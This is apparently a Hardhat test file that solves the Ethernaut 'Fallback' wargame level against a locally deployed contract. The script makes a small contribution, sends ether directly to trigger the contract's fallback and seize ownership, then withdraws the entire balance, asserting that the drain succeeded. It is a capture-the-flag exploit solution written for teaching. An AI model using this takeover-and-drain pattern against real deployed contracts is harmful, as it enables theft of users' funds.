import { expect } from "chai";
import { ethers } from "hardhat";
import { Fallback } from "typechain-types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { toWei } from "scripts/utils";

// Challenge description

// Look carefully at the contract's code below.
// You will beat this level if
// you claim ownership of the contract
// you reduce its balance to 0

describe("Ethernaut - Fallback", async () => {
  let fallback: Fallback;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    fallback = await ethers
      .getContractFactory("Fallback", owner)
      .then((f) => f.deploy());
  });

  it("Hacks", async () => {
    await fallback.connect(attacker).contribute({ value: toWei("0.0001") });

    await attacker.sendTransaction({
      to: fallback.address,
      value: toWei("0.00000001"),
    });

    expect(await fallback.owner()).equal(attacker.address);

    await fallback.connect(attacker).withdraw();

    expect(await ethers.provider.getBalance(fallback.address)).equal(0);
  });
});
